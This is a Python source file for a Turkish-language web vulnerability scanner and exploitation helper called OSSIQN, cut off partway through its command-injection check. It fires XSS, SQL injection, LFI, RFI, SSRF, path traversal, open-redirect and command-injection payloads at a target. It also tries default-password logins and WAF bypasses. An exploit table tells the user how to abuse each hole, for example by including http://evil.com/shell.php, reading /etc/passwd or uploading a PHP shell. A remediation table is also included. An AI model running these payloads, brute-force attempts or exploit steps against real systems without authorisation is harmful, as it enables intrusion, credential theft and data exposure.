import requests
import socket
import sys
import json
import urllib.parse
import os
from datetime import datetime
from colorama import init, Fore, Style
import ssl
import dns.resolver
import re
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
import time
import xml.etree.ElementTree as ET
import logging

init(autoreset=True)

logging.basicConfig(
    filename=f"ossiqn_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class OssiqnScanner:
    def __init__(self):
        self.target_url = None
        self.target_port_range = (1, 1024)
        self.target_protocol = "http"
        self.vulns = self.load_vulns()
        self.remediations = self.load_remediations()
        self.current_vuln = None
        self.vuln_options = {}
        self.detected_vulns = []
        self.wordlist = ["admin", "blog", "api", "test", "dev", "staging", "login", "backup", "old", "new", "panel", "cpanel", "ftp", "webmail", "manage"]
        self.waf_present = False
        self.exploit_db = self.load_exploit_db()

    def load_vulns(self):
        return {
            "xss": {"name": "XSS Vulnerability", "description": "Cross-Site Scripting zafiyeti", "risk": "High", "type": "web"},
            "sqli": {"name": "SQL Injection", "description": "SQL injection zafiyeti", "risk": "Critical", "type": "web"},
            "open_ports": {"name": "Open Ports", "description": "Acik portlar ve servisler", "risk": "Medium", "type": "network"},
            "lfi": {"name": "Local File Inclusion", "description": "LFI zafiyeti", "risk": "High", "type": "web"},
            "rfi": {"name": "Remote File Inclusion", "description": "RFI zafiyeti", "risk": "Critical", "type": "web"},
            "ssrf": {"name": "Server Side Request Forgery", "description": "SSRF zafiyeti", "risk": "High", "type": "web"},
            "dir_traversal": {"name": "Directory Traversal", "description": "Dizin traversal zafiyeti", "risk": "High", "type": "web"},
            "subdomain": {"name": "Subdomain Discovery", "description": "Bulunan subdomain'ler", "risk": "Low", "type": "network"},
            "http_headers": {"name": "HTTP Header Issues", "description": "Guvensiz HTTP basliklari", "risk": "Medium", "type": "web"},
            "cms_detect": {"name": "CMS Detection", "description": "Tespit edilen CMS ve surum", "risk": "Low", "type": "web"},
            "brute_force": {"name": "Brute Force Vulnerability", "description": "Zayif parola zafiyeti", "risk": "High", "type": "web"},
            "ssl_tls": {"name": "SSL/TLS Issues", "description": "Zayif SSL/TLS yapilandirmasi", "risk": "High", "type": "network"},
            "web_crawl": {"name": "Web Crawling", "description": "Bulunan gizli dizinler veya dosyalar", "risk": "Medium", "type": "web"},
            "tr_cms": {"name": "Turkce CMS Zafiyet", "description": "Turkce CMS'lerde bilinen zafiyetler", "risk": "High", "type": "web"},
            "api_vuln": {"name": "API Vulnerability", "description": "API endpoint'lerinde zafiyetler", "risk": "High", "type": "web"},
            "idor": {"name": "IDOR Vulnerability", "description": "Insecure Direct Object Reference zafiyeti", "risk": "High", "type": "web"},
            "csrf": {"name": "CSRF Vulnerability", "description": "Cross-Site Request Forgery zafiyeti", "risk": "High", "type": "web"},
            "open_redirect": {"name": "Open Redirect", "description": "Acik yonlendirme zafiyeti", "risk": "Medium", "type": "web"},
            "command_injection": {"name": "Command Injection", "description": "Komut enjeksiyonu zafiyeti", "risk": "Critical", "type": "web"},
            "xxe": {"name": "XXE Vulnerability", "description": "XML External Entity zafiyeti", "risk": "Critical", "type": "web"},
            "file_upload": {"name": "File Upload Vulnerability", "description": "Dosya yukleme zafiyeti", "risk": "High", "type": "web"},
            "waf_detect": {"name": "WAF Detection", "description": "Web Application Firewall tespiti", "risk": "Low", "type": "web"}
        }

    def load_exploit_db(self):
        return {
            "xss": {"exploit": "GET/POST parametresine <script>alert('exploit')</script> ekleyin"},
            "sqli": {"exploit": "ID parametresine ' OR 1=1-- ekleyin"},
            "lfi": {"exploit": "File parametresine ../etc/passwd ekleyin"},
            "rfi": {"exploit": "Include parametresine http://evil.com/shell.php ekleyin"},
            "ssrf": {"exploit": "URL parametresine http://localhost ekleyin"},
            "dir_traversal": {"exploit": "URL sonuna ../../etc/passwd ekleyin"},
            "idor": {"exploit": "ID degerini degistirin (orn: user/1 -> user/999)"},
            "csrf": {"exploit": "CSRF token olmadan form gonderin"},
            "open_redirect": {"exploit": "Redirect parametresine http://evil.com ekleyin"},
            "command_injection": {"exploit": "Cmd parametresine ;ls ekleyin"},
            "xxe": {"exploit": "XML input'una <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ekleyin"},
            "file_upload": {"exploit": "shell.php yukleyin ve cmd parametresiyle calistirin"}
        }

    def load_remediations(self):
        return {
            "xss": "Kullanici girdilerini (input) sanitize edin. Ciktiyi encode edin (HTML entity encoding). Content-Security-Policy (CSP) header kullanin.",
            "sqli": "Veritabani sorgularinda kesinlikle Prepared Statements (Parametreli Sorgular) veya ORM kullanin. Girdileri dogrudan SQL icine almayin.",
            "open_ports": "Gereksiz portlari firewall uzerinden kapatin. Sadece gerekli servisleri distan erisime acin (ornek: 80, 443).",
            "lfi": "Dosya yollarini dinamik olarak almayin. Aliyorsaniz, basename() gibi fonksiyonlarla sadece dosya adini alin ve bir whitelist ile kontrol edin.",
            "rfi": "Sunucu yapilandirmasinda allow_url_include ayarini Off yapin. Uzaktan dosya yuklemeyi engelleyin.",
            "ssrf": "Sunucunun disari yapacagi istekleri kati bir whitelist (izin verilen URL'ler) ile sinirlandirin. localhost ve ic ag IP'lerine istek atilmasini engelleyin.",
            "dir_traversal": "Kullanicidan alinan dosya yollarinda '../' gibi karakterleri dizelerden temizleyin. Erisim yetkilerini minimumda tutun (chroot/jail).",
            "subdomain": "Kullanilmayan subdomain kayitlarini DNS uzerinden silin. Subdomain takeover riskine karsi CNAME kayitlarini kontrol edin.",
            "http_headers": "Eksik guvenlik basliklarini (HSTS, CSP, X-Frame-Options, X-Content-Type-Options) sunucu yapilandirmasina ekleyin.",
            "cms_detect": "CMS sisteminizi ve eklentilerinizi her zaman en guncel surumde tutun. Gereksiz ve kullanilmayan eklentileri kaldirin.",
            "brute_force": "Giris denemelerine hiz siniri (Rate Limiting) getirin. Guclu parola politikasi uygulayin ve 2FA/MFA (Iki asamali dogrulama) kullanin.",
            "ssl_tls": "Guncel TLS surumlerini (TLS 1.2 veya 1.3) kullanin. Zayif cipher suite'leri (RC4, DES, MD5, SHA1) sunucu ayarlarindan devre disi birakin.",
            "web_crawl": "Hassas dizinleri ve dosyalari (.git, .env, backup dosyalari) web erisimine kapatin. robots.txt icerisinde kritik dizinleri ifsa etmeyin.",
            "tr_cms": "CMS yonetici panellerinin yollarini gizleyin veya degistirin. Varsayilan kurulum dosyalarini (install.php vb.) sunucudan aninda silin.",
            "api_vuln": "API endpointlerinde rate limiting uygulayin. Girdi dogrulamasi yapin ve gereksiz hassas verileri dondurmekten kacin.",
            "idor": "Kullanicilarin erismeye calistigi nesneler uzerinde kesin yetki kontrolu yapin. Backend uzerinde kimlik ve sahiplik dogrulamasi gerceklestirin.",
            "csrf": "Tum form gonderimlerinde ve state degistiren API isteklerinde Anti-CSRF token kullanin. SameSite cookie ayarini Strict olarak yapilandirin.",
            "open_redirect": "Yonlendirme yapilacak URL'leri guvenilir bir whitelist icinden secin. Kullanicidan dogrudan URL alip yonlendirme islemine sokmayin.",
            "command_injection": "Sistem komutlarini dogrudan calistirmayin (exec, system vb.). Mutlaka gerekli ise argumanlari kesinlikle escape fonksiyonlarindan gecirin.",
            "xxe": "XML parser yapilandirmasinda harici varliklari (External Entities) ve DTD islemeyi tamamen devre disi birakin.",
            "file_upload": "Yuklenen dosyalarin uzantilarini (whitelist) ve MIME tiplerini sunucu tarafinda kontrol edin. Dosyalari web root disinda saklayin.",
            "waf_detect": "WAF kurallarinizi sikilastirin ve bypass yontemlerine karsi algilama sistemlerinizi guncel tutun. Loglari surekli olarak izleyin."
        }

    def save_report(self):
        if not self.detected_vulns:
            return
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target_url,
            "vulnerabilities": self.detected_vulns
        }
        filename = f"ossiqn_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(os.path.join(os.getcwd(), filename), 'w') as f:
            json.dump(report, f, indent=4)
        logging.info(f"Rapor kaydedildi: {filename}")
        print(f"{Fore.GREEN}[+] Rapor kaydedildi: {filename}{Style.RESET_ALL}")

    def banner(self):
        print(f"{Fore.RED}")
        print(r"""
  ___  ____  ____ ___  ___  _   _ 
 / _ \/ ___|/ ___|_ _|/ _ \| \ | |
| | | \___ \\___ \| || | | |  \| |
| |_| |___) |___) | || |_| | |\  |
 \___/|____/|____/___|\__\_\_| \_|

              OSSIQN - Ozel Zafiyet Tarayici. | github.com/ossiqn | 2025 Vuln Tarama.
              """)
        print(f"{Fore.RED}[*] OSSIQN Coded By Ossiqn{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Kendi tarama motoru ile calisir, harici tool yok{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Kullanim: help{Style.RESET_ALL}")
        print()
        print(f"{Fore.GREEN}[+] Framework baslatildi!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Python ile custom tarama{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Otomatik acik tespiti ve cozum analizi{Style.RESET_ALL}")
        print()

    def custom_xss_scan(self, url):
        payloads = ["<script>alert(1)</script>", "'\"><script>alert(1)</script>", "';alert(1)//", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "<iframe srcdoc='<script>alert(1)</script>'"]
        for payload in payloads:
            test_url = f"{url}?q={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3)
                if "alert(1)" in response.text or "javascript:alert" in response.text:
                    logging.info(f"XSS bulundu: {test_url}, Payload: {payload}")
                    return {"type": "xss", "details": f"XSS bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: GET parametresine {payload} ekleyin. Exploit: {self.exploit_db['xss']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "q")
                    if bypassed:
                        logging.info(f"XSS WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "xss", "details": f"XSS bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: GET parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['xss']['exploit']}"}
            except Exception as e:
                logging.error(f"XSS tarama hatasi: {e}")
        return None

    def custom_sqli_scan(self, url):
        payloads = ["' OR '1'='1", "' OR 1=1--", "1' UNION SELECT 1,2,3--", "' OR 'a'='a", "1' AND SLEEP(5)--", "1' OR IF(1=1, SLEEP(5), 0)--"]
        for payload in payloads:
            test_url = f"{url}?id={urllib.parse.quote(payload)}"
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                if ("syntax error" in response.text.lower() or "union select" in response.text.lower()) or (elapsed > 5 and "SLEEP" in payload):
                    logging.info(f"SQLi bulundu: {test_url}, Payload: {payload}")
                    return {"type": "sqli", "details": f"SQLi bulundu (blind dahil): {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: ID parametresine {payload} ekleyin. Exploit: {self.exploit_db['sqli']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "id")
                    if bypassed:
                        logging.info(f"SQLi WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "sqli", "details": f"SQLi bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: ID parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['sqli']['exploit']}"}
            except Exception as e:
                logging.error(f"SQLi tarama hatasi: {e}")
        return None

    def custom_open_ports_scan(self, host):
        open_ports = []
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.2)
                if sock.connect_ex((host, port)) == 0:
                    try:
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        service = "unknown"
                        if "http" in banner.lower():
                            service = "HTTP"
                        elif "ssh" in banner.lower():
                            service = "SSH"
                        elif "ftp" in banner.lower():
                            service = "FTP"
                        elif "smtp" in banner.lower():
                            service = "SMTP"
                        elif "mysql" in banner.lower():
                            service = "MySQL"
                        elif "postgres" in banner.lower():
                            service = "PostgreSQL"
                        elif "rdp" in banner.lower():
                            service = "RDP"
                        logging.info(f"Acik port bulundu: {port}, Servis: {service}")
                        return {"port": port, "service": service, "banner": banner.strip()}
                    except:
                        return {"port": port, "service": "unknown", "banner": "No banner"}
                sock.close()
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=150) as executor:
            futures = [executor.submit(scan_port, port) for port in range(self.target_port_range[0], self.target_port_range[1] + 1)]
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        
        if open_ports:
            details = ", ".join([f"{p['port']} ({p['service']}, Banner: {p['banner']})" for p in open_ports])
            logging.info(f"Acik portlar: {details}")
            return {"type": "open_ports", "details": f"Acik portlar: {details}"}
        return None

    def custom_lfi_scan(self, url):
        payloads = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "/etc/passwd", "../windows/win.ini", "../../windows/win.ini", "../../../../etc/shadow"]
        for payload in payloads:
            test_url = f"{url}?file={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3)
                if "root:" in response.text or "[extensions]" in response.text:
                    logging.info(f"LFI bulundu: {test_url}, Payload: {payload}")
                    return {"type": "lfi", "details": f"LFI bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: File parametresine {payload} ekleyin. Exploit: {self.exploit_db['lfi']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "file")
                    if bypassed:
                        logging.info(f"LFI WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "lfi", "details": f"LFI bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: File parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['lfi']['exploit']}"}
            except Exception as e:
                logging.error(f"LFI tarama hatasi: {e}")
        return None

    def custom_rfi_scan(self, url):
        payloads = ["http://example.com/shell.txt", "http://malicious.com/evil.php", "ftp://example.com/test.txt"]
        for payload in payloads:
            test_url = f"{url}?include={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3)
                if "shell" in response.text.lower() or "evil" in response.text.lower():
                    logging.info(f"RFI bulundu: {test_url}, Payload: {payload}")
                    return {"type": "rfi", "details": f"RFI bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: Include parametresine {payload} ekleyin. Exploit: {self.exploit_db['rfi']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "include")
                    if bypassed:
                        logging.info(f"RFI WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "rfi", "details": f"RFI bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: Include parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['rfi']['exploit']}"}
            except Exception as e:
                logging.error(f"RFI tarama hatasi: {e}")
        return None

    def custom_ssrf_scan(self, url):
        payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://[::1]", "file:///etc/passwd", "http://10.0.0.1"]
        for payload in payloads:
            test_url = f"{url}?url={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3)
                if "internal" in response.text.lower() or "metadata" in response.text.lower() or "root:" in response.text:
                    logging.info(f"SSRF bulundu: {test_url}, Payload: {payload}")
                    return {"type": "ssrf", "details": f"SSRF bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: URL parametresine {payload} ekleyin. Exploit: {self.exploit_db['ssrf']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "url")
                    if bypassed:
                        logging.info(f"SSRF WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "ssrf", "details": f"SSRF bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: URL parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['ssrf']['exploit']}"}
            except Exception as e:
                logging.error(f"SSRF tarama hatasi: {e}")
        return None

    def custom_dir_traversal_scan(self, url):
        payloads = ["../", "../../", "../../../", "/../", "/../../", "../../../../../../etc/passwd", "/windows/win.ini"]
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=3)
                if "parent directory" in response.text.lower() or "index of" in response.text.lower() or "root:" in response.text:
                    logging.info(f"Dir traversal bulundu: {test_url}, Payload: {payload}")
                    return {"type": "dir_traversal", "details": f"Dir traversal bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: URL sonuna {payload} ekleyin. Exploit: {self.exploit_db['dir_traversal']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "")
                    if bypassed:
                        logging.info(f"Dir traversal WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "dir_traversal", "details": f"Dir traversal bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: URL sonuna {bypassed} ekleyin. Exploit: {self.exploit_db['dir_traversal']['exploit']}"}
            except Exception as e:
                logging.error(f"Dir traversal tarama hatasi: {e}")
        return None

    def custom_subdomain_scan(self, domain):
        subdomains = []
        resolver = dns.resolver.Resolver()
        extended_wordlist = self.wordlist + ["www", "mail", "smtp", "pop", "imap", "db", "sql", "app", "web", "secure", "vpn", "remote", "auth", "portal", "dashboard", "server"]
        def resolve_subdomain(sub):
            try:
                test_domain = f"{sub}.{domain}"
                answers = resolver.resolve(test_domain, 'A')
                for ip in answers:
                    logging.info(f"Subdomain bulundu: {test_domain}, IP: {str(ip)}")
                    return {"subdomain": test_domain, "ip": str(ip)}
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(resolve_subdomain, sub) for sub in extended_wordlist]
            for future in futures:
                result = future.result()
                if result:
                    subdomains.append(result)
        
        if subdomains:
            details = ", ".join([f"{s['subdomain']} ({s['ip']})" for s in subdomains])
            return {"type": "subdomain", "details": f"Subdomain'ler: {details}"}
        return None

    def custom_http_headers_scan(self, url):
        try:
            response = requests.get(url, timeout=3)
            headers = response.headers
            issues = []
            if "Server" in headers:
                issues.append(f"Server basligi: {headers['Server']}")
            if "X-Powered-By" in headers:
                issues.append(f"X-Powered-By basligi: {headers['X-Powered-By']}")
            if "X-Frame-Options" not in headers:
                issues.append("X-Frame-Options basligi eksik")
            if "Content-Security-Policy" not in headers:
                issues.append("Content-Security-Policy basligi eksik")
            if "Strict-Transport-Security" not in headers:
                issues.append("HSTS basligi eksik")
            if "X-Content-Type-Options" not in headers:
                issues.append("X-Content-Type-Options basligi eksik")
            if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
                issues.append("CORS basligi guvensiz")
            if issues:
                logging.info(f"HTTP baslik sorunlari: {', '.join(issues)}")
                return {"type": "http_headers", "details": f"Baslik sorunlari: {', '.join(issues)}"}
        except Exception as e:
            logging.error(f"HTTP baslik tarama hatasi: {e}")
        return None

    def custom_cms_detect(self, url):
        try:
            response = requests.get(url, timeout=3)
            text = response.text.lower()
            cms = "unknown"
            if "/wp-content/" in text or "wordpress" in text:
                cms = "WordPress"
                version_match = re.search(r'wordpress[ /](\d+\.\d+\.\d+)', text)
                version = version_match.group(1) if version_match else "unknown"
            elif "joomla" in text:
                cms = "Joomla"
                version_match = re.search(r'joomla[ /](\d+\.\d+\.\d+)', text)
                version = version_match.group(1) if version_match else "unknown"
            elif "drupal" in text:
                cms = "Drupal"
                version_match = re.search(r'drupal[ /](\d+\.\d+)', text)
                version = version_match.group(1) if version_match else "unknown"
            elif "laravel" in text:
                cms = "Laravel"
                version_match = re.search(r'laravel[ /](\d+\.\d+)', text)
                version = version_match.group(1) if version_match else "unknown"
            elif "shopify" in text:
                cms = "Shopify"
                version = "unknown"
            elif "magento" in text:
                cms = "Magento"
                version = "unknown"
            elif "opencart" in text:
                cms = "OpenCart"
                version = "unknown"
            elif "prestashop" in text:
                cms = "PrestaShop"
                version = "unknown"
            if cms != "unknown":
                logging.info(f"CMS tespit edildi: {cms}, Surum: {version}")
                return {"type": "cms_detect", "details": f"CMS: {cms}, Surum: {version}"}
        except Exception as e:
            logging.error(f"CMS tarama hatasi: {e}")
        return None

    def custom_brute_force_scan(self, url):
        login_url = f"{url}/login"
        payloads = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("user", "user"), ("root", "root"), ("test", "test"), ("guest", "guest"), ("admin", "admin123"), ("admin", "letmein"), ("test", "password")]
        for username, password in payloads:
            try:
                response = requests.post(login_url, data={"username": username, "password": password}, timeout=3)
                if "login failed" not in response.text.lower() and response.status_code == 200:
                    logging.info(f"Brute force zafiyeti bulundu: {username}:{password}")
                    return {"type": "brute_force", "details": f"Zayif parola bulundu: {username}:{password}"}
            except Exception as e:
                logging.error(f"Brute force tarama hatasi: {e}")
        return None

    def custom_ssl_tls_scan(self, host):
        try:
            context = ssl.create_default_context()
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    issues = []
                    if "TLSv1.0" in cipher or "TLSv1.1" in cipher or "SSL" in cipher:
                        issues.append(f"Zayif protokol: {cipher[1]}")
                    if "RC4" in cipher[0] or "3DES" in cipher[0] or "DES" in cipher[0]:
                        issues.append(f"Zayif cipher: {cipher[0]}")
                    expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if expire_date < datetime.now():
                        issues.append("Sertifika suresi dolmus")
                    if "MD5" in cert.get('signatureAlgorithm', '') or "SHA1" in cert.get('signatureAlgorithm', ''):
                        issues.append("Zayif imza algoritmasi")
                    if issues:
                        logging.info(f"SSL/TLS sorunlari: {', '.join(issues)}")
                        return {"type": "ssl_tls", "details": f"SSL/TLS sorunlari: {', '.join(issues)}"}
        except Exception as e:
            logging.error(f"SSL/TLS tarama hatasi: {e}")
        return None

    def custom_web_crawl(self, url):
        found_urls = []
        extended_wordlist = self.wordlist + [".bak", ".old", ".sql", ".zip", ".txt", ".php", ".asp", ".js", ".config", ".db", ".inc", ".swp", ".backup", ".log"]
        def crawl_path(path):
            full_url = urljoin(url, path)
            try:
                res = requests.get(full_url, timeout=3)
                if res.status_code == 200:
                    logging.info(f"Crawl bulundu: {full_url}")
                    return full_url
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(crawl_path, path) for path in extended_wordlist]
            for future in futures:
                result = future.result()
                if result:
                    found_urls.append(result)
        
        try:
            response = requests.get(url, timeout=3)
            links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
            scripts = re.findall(r'src=[\'"]?([^\'" >]+)', response.text)
            all_links = links + scripts
            for link in all_links:
                full_url = urljoin(url, link)
                try:
                    res = requests.get(full_url, timeout=3)
                    if res.status_code == 200:
                        found_urls.append(full_url)
                        logging.info(f"Crawl bulundu: {full_url}")
                except:
                    pass
        except Exception as e:
            logging.error(f"Web crawl hatasi: {e}")
        if found_urls:
            return {"type": "web_crawl", "details": f"Bulunan URL'ler: {', '.join(set(found_urls))}"}
        return None

    def custom_tr_cms_scan(self, url):
        payloads = [
            "/wp-content/plugins/backup/backup.sql", "/admin/config.php", "/wp-admin/install.php",
            "/inc/db.php", "/config/database.php", "/Uploads/shell.php", "/panel/admin.php.bak",
            "/include/connect.inc", "/db/config.php", "/system/config/database.php", "/app/etc/local.xml",
            "/backup.sql", "/config.inc.php", "/settings.php", "/wp-config.php.bak"
        ]
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=3)
                if response.status_code == 200:
                    logging.info(f"Turkce CMS zafiyeti bulundu: {test_url}, Payload: {payload}")
                    return {"type": "tr_cms", "details": f"Turkce CMS zafiyeti bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: URL sonuna {payload} ekleyin."}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "")
                    if bypassed:
                        logging.info(f"Turkce CMS zafiyeti WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "tr_cms", "details": f"Turkce CMS zafiyeti bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: URL sonuna {bypassed} ekleyin."}
            except Exception as e:
                logging.error(f"Turkce CMS tarama hatasi: {e}")
        return None

    def custom_api_vuln_scan(self, url):
        endpoints = ["/api/v1/users", "/api/v2/auth", "/api/v1/data", "/api/user/1", "/api/user/2", "/api/order/1", "/api/item/1", "/api/v1/config"]
        for endpoint in endpoints:
            test_url = f"{url}{endpoint}"
            try:
                response = requests.get(test_url, timeout=3)
                if response.status_code == 200 and "json" in response.headers.get("Content-Type", "").lower():
                    idor_test = f"{url}{endpoint.replace('1', '999999')}"
                    idor_res = requests.get(idor_test, timeout=3)
                    if idor_res.status_code == 200 and len(idor_res.text) > 0:
                        logging.info(f"API IDOR bulundu: {idor_test}")
                        return {"type": "api_vuln", "details": f"Acik API endpoint (IDOR dahil): {test_url}. Payloadi otomatik at: ID=999999. Dosyanizi siteye yerlestirmek icin: ID parametresini manipule edin."}
                    logging.info(f"Acik API endpoint: {test_url}")
                    return {"type": "api_vuln", "details": f"Acik API endpoint: {test_url}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, endpoint, "")
                    if bypassed:
                        logging.info(f"API zafiyeti WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "api_vuln", "details": f"Acik API endpoint (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: Endpoint'e {bypassed} ekleyin."}
            except Exception as e:
                logging.error(f"API tarama hatasi: {e}")
        return None

    def custom_idor_scan(self, url):
        payloads = ["/user/1", "/user/2", "/profile/1", "/file/1", "/order/1", "/document/1"]
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=3)
                if response.status_code == 200:
                    idor_test = f"{url}{payload.replace('1', '999999')}"
                    idor_res = requests.get(idor_test, timeout=3)
                    if idor_res.status_code == 200 and len(idor_res.text) > 0:
                        logging.info(f"IDOR bulundu: {idor_test}")
                        return {"type": "idor", "details": f"IDOR bulundu: {idor_test}. Payloadi otomatik at: ID=999999. Dosyanizi siteye yerlestirmek icin: ID parametresini manipule edin. Exploit: {self.exploit_db['idor']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "")
                    if bypassed:
                        logging.info(f"IDOR WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "idor", "details": f"IDOR bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: ID parametresini manipule edin. Exploit: {self.exploit_db['idor']['exploit']}"}
            except Exception as e:
                logging.error(f"IDOR tarama hatasi: {e}")
        return None

    def custom_csrf_scan(self, url):
        try:
            response = requests.get(url, timeout=3)
            forms = re.findall(r'<form.*?>(.*?)</form>', response.text, re.DOTALL)
            for form in forms:
                if "csrf" not in form.lower() and "token" not in form.lower():
                    logging.info(f"CSRF token eksikligi bulundu: {url}")
                    return {"type": "csrf", "details": f"CSRF token eksikligi bulundu: {url}. Payloadi otomatik at: Formu tekrar gonderin. Dosyanizi siteye yerlestirmek icin: CSRF token olmadan form gonderin. Exploit: {self.exploit_db['csrf']['exploit']}"}
        except Exception as e:
            logging.error(f"CSRF tarama hatasi: {e}")
        return None

    def custom_open_redirect_scan(self, url):
        payloads = ["//google.com", "http://evil.com", "/redirect?url=http://evil.com", "//attacker.com", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="]
        for payload in payloads:
            test_url = f"{url}?redirect={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3, allow_redirects=False)
                if response.status_code in [301, 302] and ("evil.com" in response.headers.get("Location", "") or "attacker.com" in response.headers.get("Location", "")):
                    logging.info(f"Open redirect bulundu: {test_url}, Payload: {payload}")
                    return {"type": "open_redirect", "details": f"Open redirect bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: Redirect parametresine {payload} ekleyin. Exploit: {self.exploit_db['open_redirect']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "redirect")
                    if bypassed:
                        logging.info(f"Open redirect WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "open_redirect", "details": f"Open redirect bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: Redirect parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['open_redirect']['exploit']}"}
            except Exception as e:
                logging.error(f"Open redirect tarama hatasi: {e}")
        return None

    def custom_command_injection_scan(self, url):
        payloads = [";ls", "|ls", "&ls", ";cat /etc/passwd", "|cat /etc/passwd", ";sleep 5", "|sleep 5", ";ping -c 5 127.0.0.1"]
        for payload in payloads:
            test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                if "root:" in response.text or "bin" in response.text or elapsed > 5:
                    logging.info(f"Command injection bulundu: {test_url}, Payload: {payload}")
